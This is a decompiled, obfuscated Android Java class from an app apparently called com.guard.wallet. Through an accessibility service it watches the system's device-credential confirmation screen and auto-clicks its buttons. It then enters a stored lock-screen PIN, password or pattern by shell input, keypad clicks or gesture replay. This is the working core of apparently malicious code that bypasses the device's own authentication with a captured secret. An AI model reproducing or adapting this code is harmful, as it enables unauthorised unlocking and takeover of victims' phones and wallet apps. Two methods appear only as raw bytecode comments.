package o;

import android.graphics.Rect;
import android.os.Build.VERSION;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.DeviceWalletAuthStrategyVO;
import com.guard.wallet.service.AccessibilityDelegateManager;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

public final class g0 extends e {
   public final ThreadPoolExecutor n;
   public final ConcurrentLinkedQueue o;
   public final ConcurrentLinkedQueue p;
   public final ConcurrentLinkedQueue q;
   public final AtomicReference r;
   public final AtomicReference s;

   public g0() {
      r.c var1 = r.c.b;
      super(T(), "com.android.systemui");
      this.n = new ThreadPoolExecutor(0, 5, 10L, TimeUnit.SECONDS, new SynchronousQueue<>());
      this.o = new ConcurrentLinkedQueue();
      this.p = new ConcurrentLinkedQueue();
      this.q = new ConcurrentLinkedQueue();
      this.r = new AtomicReference(null);
      this.s = new AtomicReference<>(var1);
      this.X(var1);
      if (Objects.equals(this.R(), var1)) {
         com.guard.wallet.http.l.v();
      }
   }

   public static CombineFilter H() {
      CombineFilter var1 = new CombineFilter();
      var1.setStringConditions(new LinkedList<>());
      StringCondition var0 = new StringCondition();
      var0.setProperty("id");
      var0.setEquals("com.android.systemui".concat(":id/cancel"));
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static CombineFilter I() {
      CombineFilter var1 = new CombineFilter();
      var1.setStringConditions(new LinkedList<>());
      StringCondition var0 = new StringCondition();
      var0.setProperty("id");
      var0.setEquals("com.android.systemui".concat(":id/button_negative"));
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static CombineFilter J() {
      CombineFilter var0 = new CombineFilter();
      var0.setStringConditions(new LinkedList<>());
      StringCondition var1 = new StringCondition();
      var1.setProperty("id");
      var1.setEquals("com.android.systemui".concat(":id/button_use_credential"));
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static CombineFilter L() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.view.ViewGroup"), "id");
      var0.setPrefix("com.android.systemui".concat(":id/key"));
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static LinkedList T() {
      LinkedList var1 = new LinkedList();
      ListenWindow var2 = new ListenWindow("com.android.systemui", "com.android.settings.password.ConfirmDeviceCredentialActivity");
      HashSet var3 = o.b.r(var2);
      Integer var0 = 32;
      var3.add(var0);
      HashSet var4 = var2.getEventTypes();
      Integer var9 = 16384;
      var4.add(var9);
      HashSet var5 = var2.getEventTypes();
      Integer var10 = 8;
      var5.add(var10);
      HashSet var6 = var2.getEventTypes();
      Integer var11 = 2048;
      var6.add(var11);
      HashSet var7 = var2.getEventTypes();
      Integer var12 = AccessibilityDelegateManager.j;
      var7.add(var12);
      var1.add(var2);
      var2 = new ListenWindow("com.android.systemui", null);
      var2.setEventTypes(new HashSet<>());
      var2.getEventTypes().add(var0);
      var2.getEventTypes().add(var9);
      var2.getEventTypes().add(var10);
      var2.getEventTypes().add(var11);
      var2.getEventTypes().add(var12);
      var1.add(var2);
      return var1;
   }

   public static CombineFiltersWithOr U() {
      CombineFiltersWithOr var0 = new CombineFiltersWithOr();
      var0.setFilters(new LinkedList<>());
      List var3 = var0.getFilters();
      CombineFilter var1 = new CombineFilter();
      StringCondition var2 = o.b.b(var1, a.a.c(var1, "className", "android.view.View"), "id");
      var2.setEquals("com.android.systemui".concat(":id/lockPattern"));
      var1.getStringConditions().add(var2);
      var3.add(var1);
      List var4 = var0.getFilters();
      CombineFilter var5 = new CombineFilter();
      StringCondition var6 = o.b.b(var5, a.a.c(var5, "className", "android.view.View"), "id");
      var6.setEquals("com.android.systemui".concat(":id/biometric_lockPattern"));
      var5.getStringConditions().add(var6);
      var4.add(var5);
      return var0;
   }

   public static CombineFilter W(String var0) {
      CombineFilter var1 = new CombineFilter();
      StringCondition var2 = a.a.b(var1, a.a.c(var1, "className", "android.view.View"), "desc", var0);
      var1.getStringConditions().add(var2);
      return var1;
   }

   public static CombineFilter Y() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Button"), "id");
      var0.setPrefix("com.android.systemui".concat(":id/num"));
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static CombineFilter Z() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.Button"), "id");
      var0.setPrefix("com.android.systemui".concat(":id/four_to_more_key"));
      var1.getStringConditions().add(var0);
      return var1;
   }

   public final boolean K() {
      AtomicInteger var2 = new AtomicInteger(0);
      boolean var1 = Objects.equals(MyAccessibilityService.N(), "com.android.systemui");

      while (true) {
         var1 ^= true;
         if (var2.incrementAndGet() > 20 || var1) {
            return var1;
         }

         com.guard.wallet.utils.g.T0(1);
         var1 = Objects.equals(MyAccessibilityService.N(), "com.android.systemui");
      }
   }

   public final void M() {
      if (MyAccessibilityService.P() != null && this.k() != null && com.guard.wallet.utils.e.l()) {
         UiObject var2 = this.k();
         CombineFilter var3 = new CombineFilter();
         StringCondition var1 = o.b.b(var3, a.a.c(var3, "className", "android.view.View"), "id");
         var1.setEquals("com.android.systemui".concat(":id/mix_confirm"));
         var3.getStringConditions().add(var1);
         UiObject var4 = var2.findOneByCombine(var3);
         if (var4 != null && var4.click()) {
            return;
         }

         UiObject var5 = this.k();
         CombineFilter var11 = new CombineFilter();
         StringCondition var14 = o.b.b(var11, a.a.c(var11, "className", "android.widget.TextView"), "id");
         var14.setEquals("com.android.systemui".concat(":id/iv_complete"));
         var11.getStringConditions().add(var14);
         UiObject var6 = var5.findOneByCombine(var11);
         if (var6 != null && var6.click()) {
            return;
         }

         var2 = this.k();
         CombineFilter var7 = new CombineFilter();
         StringCondition var15 = o.b.b(var7, a.a.c(var7, "className", "android.widget.Button"), "id");
         var15.setEquals("com.android.systemui".concat(":id/vivo_pin_confirm"));
         var7.getStringConditions().add(var15);
         UiObject var8 = var2.findOneByCombine(var7);
         if (var8 != null && var8.click()) {
            return;
         }

         UiObject var16 = this.k();
         CombineFilter var9 = new CombineFilter();
         StringCondition var13 = o.b.b(var9, a.a.c(var9, "className", "android.widget.TextView"), "id");
         var13.setEquals("com.android.systemui".concat(":id/mix_normal_confirm"));
         var9.getStringConditions().add(var13);
         UiObject var10 = var16.findOneByCombine(var9);
         if (var10 != null) {
            var10.click();
         }
      }
   }

   public final boolean N() {
      ReqUnlockDeviceVO var2 = com.guard.wallet.utils.h.f();
      boolean var1;
      if (var2 != null) {
         var1 = this.P(var2);
      } else {
         var1 = false;
      }

      if (var1) {
         var2.setLocked(Boolean.TRUE);
         com.guard.wallet.utils.h.C(var2);
         this.o.remove("inUseDeviceCredential");
      }

      return var1;
   }

   public final boolean O() {
      ReqUnlockDeviceVO var2 = com.guard.wallet.utils.h.g();
      boolean var1;
      if (var2 != null) {
         var1 = this.P(var2);
      } else {
         var1 = false;
      }

      if (var1) {
         var2.setLocked(Boolean.TRUE);
         com.guard.wallet.utils.h.C(var2);
         this.o.remove("inUseDeviceCredential");
      }

      return var1;
   }

   public final boolean P(ReqUnlockDeviceVO var1) {
      if ((
            Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX")
               || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_ALPHANUMERIC")
               || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC")
               || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")
         )
         && !a1.q.B(var1.getTextCipher())) {
         boolean var3;
         label290: {
            String var8 = var1.getTextCipher();
            if (!a1.q.B(var8)) {
               if (h.e.S() != null && h.e.S().D()) {
                  com.guard.wallet.utils.g.T0(1);
                  String var6 = "input text ".concat(var8);
                  if (h.e.S().N(var6)) {
                     this.Q(null);
                     if (this.K()) {
                        var3 = true;
                        break label290;
                     }
                  }
               }

               if (this.k() != null) {
                  UiObject var7 = this.k().currentFocusedNode();
                  UiObject var26 = var7;
                  if (var7 == null) {
                     var26 = MyAccessibilityService.P().J();
                  }

                  if (var26 != null && Objects.equals(var26.className(), "android.widget.EditText") && var26.setText(var8)) {
                     this.Q(var26);
                     var3 = this.K();
                     break label290;
                  }
               }
            }

            var3 = false;
         }

         if (var3) {
            return true;
         }

         label275: {
            label318: {
               String var27 = var1.getTextCipher();
               String var34 = var1.getCipherGradeCode();
               if (!a1.q.B(var27) && MyAccessibilityService.P() != null) {
                  var3 = Objects.equals(var34, "PASSWORD_QUALITY_NUMERIC_COMPLEX");
                  AtomicReference var30 = super.j;
                  if (!var3 && !Objects.equals(var34, "PASSWORD_QUALITY_NUMERIC") && !Objects.equals(var34, "PASSWORD_QUALITY_TOUCH_POINTS")) {
                     if (Objects.equals(var34, "PASSWORD_QUALITY_ALPHANUMERIC")
                        && !a1.q.B(var27)
                        && MyAccessibilityService.P() != null
                        && this.k() != null
                        && com.guard.wallet.utils.e.l()) {
                        UiObjectCollection var38 = this.k().findByCombine(Y());
                        UiObject var54 = this.k();
                        CombineFilter var44 = new CombineFilter();
                        StringCondition var48 = o.b.b(var44, a.a.c(var44, "className", "android.widget.Button"), "id");
                        var48.setPrefix("com.android.systemui".concat(":id/char_"));
                        var44.getStringConditions().add(var48);
                        UiObjectCollection var45 = var54.findByCombine(var44);
                        if (var38 != null && var38.size() > 0 && var45 != null && var45.size() > 0) {
                           for (int var17 = 0; var17 < var27.length(); var17++) {
                              String var49 = String.valueOf(var27.charAt(var17));
                              if (a1.q.D(var49)) {
                                 String var51 = ((String)var30.get()).concat(":id/num").concat(var49);

                                 for (UiObject var60 : var38.getNodes()) {
                                    if (var60 != null && Objects.equals(var60.id(), var51) && var60.click()) {
                                       StringBuilder var61 = new StringBuilder("Click VIVO Num Node ID:");
                                       var61.append(var51);
                                       Log.d("UseDeviceCredentialDelegate", var61.toString());
                                       com.guard.wallet.utils.g.T0(1);
                                    }
                                 }
                              } else {
                                 String var55 = ((String)var30.get()).concat(":id/char_").concat(var49);

                                 for (UiObject var58 : var45.getNodes()) {
                                    if (var58 != null && Objects.equals(var58.id(), var55) && var58.click()) {
                                       StringBuilder var59 = new StringBuilder("Click VIVO Char Node ID:");
                                       var59.append(var55);
                                       Log.d("UseDeviceCredentialDelegate", var59.toString());
                                       com.guard.wallet.utils.g.T0(1);
                                    }
                                 }
                              }
                           }

                           this.M();
                           var3 = this.K();
                           break label275;
                        }
                     }
                  } else if (!a1.q.B(var27) && MyAccessibilityService.P() != null && this.k() != null) {
                     if (com.guard.wallet.utils.e.i()) {
                        for (int var2 = 0; var2 < var27.length(); var2++) {
                           var34 = String.valueOf(var27.charAt(var2));
                           UiObject var9 = this.k().findOneByCombine(W(var34));
                           if (var9 != null && var9.click()) {
                              StringBuilder var41 = new StringBuilder("Click Pin Node ID:");
                              var41.append(var34);
                              Log.d("UseDeviceCredentialDelegate", var41.toString());
                              com.guard.wallet.utils.g.T0(1);
                           }
                        }

                        this.M();
                        if (this.K()) {
                           break label318;
                        }
                     }

                     if (com.guard.wallet.utils.e.l()) {
                        UiObjectCollection var42 = this.k().findByCombine(Z());
                        String var11 = ((String)var30.get()).concat(":id/four_to_more_key");
                        if (var42 != null && var42.size() > 0) {
                           for (int var15 = 0; var15 < var27.length(); var15++) {
                              var34 = var11.concat(String.valueOf(var27.charAt(var15)));

                              for (UiObject var12 : var42.getNodes()) {
                                 if (var12 != null && Objects.equals(var12.id(), var34) && var12.click()) {
                                    StringBuilder var57 = new StringBuilder("Click Pin Node ID:");
                                    var57.append(var34);
                                    Log.d("UseDeviceCredentialDelegate", var57.toString());
                                    com.guard.wallet.utils.g.T0(1);
                                 }
                              }
                           }

                           this.M();
                           var3 = this.K();
                        } else {
                           var3 = false;
                        }

                        if (var3) {
                           break label318;
                        }
                     }

                     var34 = ((String)var30.get()).concat(":id/key");
                     UiObjectCollection var43 = this.k().findByCombine(L());
                     if (var43 != null && var43.size() > 0) {
                        for (int var16 = 0; var16 < var27.length(); var16++) {
                           String var47 = var34.concat(String.valueOf(var27.charAt(var16)));

                           for (UiObject var52 : var43.getNodes()) {
                              if (var52 != null && Objects.equals(var52.id(), var47) && var52.click()) {
                                 StringBuilder var53 = new StringBuilder("Click Pin Node ID:");
                                 var53.append(var47);
                                 Log.d("UseDeviceCredentialDelegate", var53.toString());
                                 com.guard.wallet.utils.g.T0(1);
                              }
                           }
                        }

                        this.M();
                        var3 = this.K();
                        break label275;
                     }
                  }
               }

               var3 = false;
               break label275;
            }

            var3 = true;
         }

         if (var3) {
            return true;
         }
      }

      if (Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
         boolean var25;
         label188: {
            List var39 = var1.getPatternCipher();
            Rect var28 = var1.getBoundsInScreen();
            Rect var32 = var1.getBoundsInParent();
            if (var39 != null && !var39.isEmpty()) {
               LinkedList var14 = new LinkedList(var39);
               com.guard.wallet.helper.a.d(var14);
               if (this.k() != null && MyAccessibilityService.P() != null) {
                  UiObject var46 = this.k().findOneByOperateOr(U());
                  if (var46 != null) {
                     StringBuilder var40 = new StringBuilder("confirmLockByGesture pattern:");
                     var40.append(var46);
                     Log.d("UseDeviceCredentialDelegate", var40.toString());
                     if (!com.guard.wallet.utils.e.l()) {
                        com.guard.wallet.helper.a.e(var14, var28, var32, var46.boundsInWindow(), var46.boundsInParent());
                     }

                     label180: {
                        int var18 = var14.size();
                        Point[] var29 = new Point[var18];
                        var14.toArray(var29);
                        if (var18 > 0) {
                           for (int var19 = 1; var19 <= 4; var19++) {
                              long var4 = (long)var19 * 1000L;

                              try {
                                 CountDownLatch var33 = new CountDownLatch(1);
                                 if (!com.guard.wallet.utils.g.S(10L, var4, var29)) {
                                    continue;
                                 }

                                 if (!var33.await(var4 + 1000L, TimeUnit.MILLISECONDS)) {
                                    Log.d("UseDeviceCredentialDelegate", "ResolveGesture Done");
                                 }

                                 var25 = this.K();
                              } catch (Exception var13) {
                                 a1.q.s("UseDeviceCredentialDelegate", var13);
                                 break;
                              }

                              if (var25) {
                                 var25 = true;
                                 break label180;
                              }
                           }
                        }

                        var25 = this.K();
                     }

                     if (var25) {
                        var25 = true;
                        break label188;
                     }

                     if (h.e.S() != null && h.e.S().D() && h.e.S().W(var14)) {
                        var25 = this.K();
                        break label188;
                     }
                  }
               }
            }

            var25 = false;
         }

         if (var25) {
            return true;
         }
      }

      return false;
   }

   public final void Q(UiObject var1) {
      if (h.e.S() == null || !h.e.S().D() || !h.e.S().N("input keyevent 66")) {
         UiObject var2 = var1;
         if (var1 == null) {
            var2 = var1;
            if (this.k() != null) {
               var2 = this.k().currentFocusedNode();
            }
         }

         var1 = var2;
         if (var2 == null) {
            var1 = var2;
            if (MyAccessibilityService.P() != null) {
               var1 = MyAccessibilityService.P().J();
            }
         }

         if (var1 != null && VERSION.SDK_INT >= 30) {
            var1.enter();
         }
      }
   }

   public final r.c R() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      //
      // Bytecode:
      // 00: ldc r/c
      // 02: monitorenter
      // 03: aload 0
      // 04: getfield o/g0.s Ljava/util/concurrent/atomic/AtomicReference;
      // 07: invokevirtual java/util/concurrent/atomic/AtomicReference.get ()Ljava/lang/Object;
      // 0a: checkcast r/c
      // 0d: astore 1
      // 0e: ldc r/c
      // 10: monitorexit
      // 11: aload 1
      // 12: areturn
      // 13: astore 1
      // 14: ldc r/c
      // 16: monitorexit
      // 17: aload 1
      // 18: athrow
   }

   public final boolean S() {
      boolean var1 = Objects.equals(this.R(), r.c.d);
      boolean var2 = false;
      if (var1) {
         return false;
      } else {
         var1 = Objects.equals(this.R(), r.c.c);
         AtomicReference var3 = this.r;
         if (var1 && var3.get() != null) {
            return true;
         } else {
            var1 = var2;
            if (Objects.equals(this.R(), r.c.b)) {
               var1 = var2;
               if (var3.get() != null) {
                  var1 = true;
               }
            }

            return var1;
         }
      }
   }

   public final void V(String var1, String var2) {
      boolean var3 = Objects.equals(this.R(), r.c.c);
      AtomicReference var4 = this.r;
      if (var3) {
         ConcurrentLinkedQueue var5 = this.q;
         if (!var5.isEmpty() && !a1.q.B(var1) && var5.contains(var1)) {
            var4.set(var1);
            return;
         }
      }

      if (Objects.equals(this.R(), r.c.b)) {
         ConcurrentLinkedQueue var6 = this.p;
         if (!var6.isEmpty() && (!a1.q.B(var1) || !a1.q.B(var2))) {
            DeviceWalletAuthStrategyVO var7 = new DeviceWalletAuthStrategyVO();
            var7.setPackageName(var1);
            var7.setListenWinClasses(Collections.singletonList(var2));
            if (var6.contains(var7)) {
               var4.set(var1);
            } else {
               var4.set(null);
               com.guard.wallet.http.l.v();
            }
         }
      }
   }

   public final void X(r.c param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      //
      // Bytecode:
      // 00: ldc r/c
      // 02: monitorenter
      // 03: aload 0
      // 04: getfield o/g0.s Ljava/util/concurrent/atomic/AtomicReference;
      // 07: aload 1
      // 08: invokevirtual java/util/concurrent/atomic/AtomicReference.set (Ljava/lang/Object;)V
      // 0b: ldc r/c
      // 0d: monitorexit
      // 0e: return
      // 0f: astore 1
      // 10: ldc r/c
      // 12: monitorexit
      // 13: aload 1
      // 14: athrow
   }

   @Override
   public final void d() {
      try {
         this.n.shutdownNow();
         this.o.clear();
         this.p.clear();
         this.q.clear();
         this.r.set(null);
         super.d();
      } catch (Exception var2) {
         a1.q.s("UseDeviceCredentialDelegate", var2);
      }
   }

   @Override
   public final boolean equals(Object var1) {
      return var1 instanceof g0;
   }

   @Override
   public final int hashCode() {
      return Objects.hash(g0.class.getName());
   }

   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      if (!com.guard.wallet.utils.g.p0()) {
         if (this.S()) {
            super.u(var1, var2, var3);
         }

         if (this.S()) {
            boolean var4;
            label28: {
               if (this.q(T())) {
                  UiObject var6 = this.k();
                  CombineFiltersWithOr var9 = new CombineFiltersWithOr();
                  var9.setFilters(new LinkedList<>());
                  var9.getFilters().add(J());
                  var9.getFilters().add(I());
                  UiObject var7 = var6.findOneByOperateOr(var9);
                  if (var7 == null) {
                     Log.d("UseDeviceCredentialDelegate", "已进入用户设备密码验证窗口");
                     var4 = true;
                     break label28;
                  }

                  var7.click();
                  Log.d("UseDeviceCredentialDelegate", "已点击密码验证引导按钮");
               }

               var4 = false;
            }

            if (var4) {
               boolean var5 = Objects.equals(this.R(), r.c.c);
               ThreadPoolExecutor var8 = this.n;
               if (var5) {
                  var8.submit(new f0(this, 0));
               }

               if (Objects.equals(this.R(), r.c.b)) {
                  var8.submit(new f0(this, 1));
               }
            }
         }
      }
   }
}
